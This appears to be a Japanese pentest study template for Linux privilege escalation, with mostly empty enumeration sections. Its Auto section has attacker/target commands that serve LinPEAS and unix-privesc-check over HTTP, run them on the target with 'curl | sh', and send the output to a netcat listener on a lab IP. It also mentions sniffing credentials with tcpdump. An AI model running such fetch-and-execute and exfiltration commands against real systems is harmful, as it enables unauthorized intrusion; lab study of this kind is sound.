- `/var/mail/root`を確認すると、Cron daemonからの自動メールログが確認できる
- Cronでは、コマンド引数である`X-Cron-Env`を閲覧
- openポートにメール用のポート（SMTPなど）がopenであることを確認


---

# Auto 

## unix-privesc-check

### 転送・実行

```zsh
# Attacker
cp /usr/bin/unix-privesc-check .
python -m http.server 8888
nc -lvnp 9002 | tee unix-privesc-check.out
```
```zsh
# Target
curl 192.168.45.201:8888/unix-privesc-check | sh -s standard | nc -q 0 192.168.45.201 9002
```

### 実行結果抽出


---

## LinPEAS

### 転送・実行

```zsh
# Attacker
cp /usr/share/peass/linpeas/linpeas.sh .
python -m http.server 8888
nc -lvnp 9002 | tee linpeas.out
```
```zsh
# Target
curl 192.168.45.201:8888/linpeas.sh | sh | nc -q 0 192.168.45.201 9002
```

### 実行結果抽出

```powershell

```

---
---

# Manual

## ユーザー


---

## システム情報


---

## 実行中のプロセス


---

## ネットワーク


---

## Cron


---

## インストール済みアプリケーション


---

## アクセス制限が不十分なファイル/ディレクトリ


---

## マウントされていないドライブ


---

## 高権限をもつバイナリの列挙



---

## システムデーモン

- 気になるデーモン
```sh
/usr/sbin/sendmail -FCronDaemon elldllla: -FCronDaemon -1 -odi -oem -oi -t -f root

/usr/bin/mongod -f /etc/mongod.conf

bash /root/restart.sh
postgres: autovacuum worker process openfire
```

- tcpdumpしたところ、30からの認証情報を発見
	- pbxサーバーという、ホスト名から、これがUDPパケットを絶えず送信している、と想定する（**ホスト名から役割を推測すること**）

---

## 共有フォルダ、SNMP情報


---

## 興味深い情報


---

## デバイスドライバ・カーネルモジュール



